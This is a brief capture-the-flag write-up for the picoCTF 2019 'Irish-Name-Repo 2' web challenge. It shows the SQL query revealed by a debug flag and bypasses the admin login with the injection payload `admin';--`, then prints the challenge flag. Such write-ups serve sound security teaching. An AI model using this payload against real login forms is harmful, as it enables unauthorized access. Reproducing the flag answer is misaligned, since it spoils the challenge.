---
layout: writeup
title: Irish-Name-Repo 2
year: 2019
---
# Irish-Name-Repo 2
Category: Web Exploitation

## Description

> There is a website running at [https://jupiter.challenges.picoctf.org/problem/64649/](https://jupiter.challenges.picoctf.org/problem/64649/) or [http://jupiter.challenges.picoctf.org:64649](http://jupiter.challenges.picoctf.org:64649). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! 

# Solution

This is the follow-up to [part nr 1](#Irish-Name-Repo 1). Again, we'll focus on the *Admin login*. Setting `debug=1` in Burp reveals the following response
```
username: user
password: pass
SQL query: SELECT * FROM users WHERE name='user' AND password='pass'
```

To solve this, we simply type `admin';--` as login and leave the password empty. We get our flag
```
Logged in!
Your flag is: picoCTF{m0R3_SQL_plz_aee925db}
```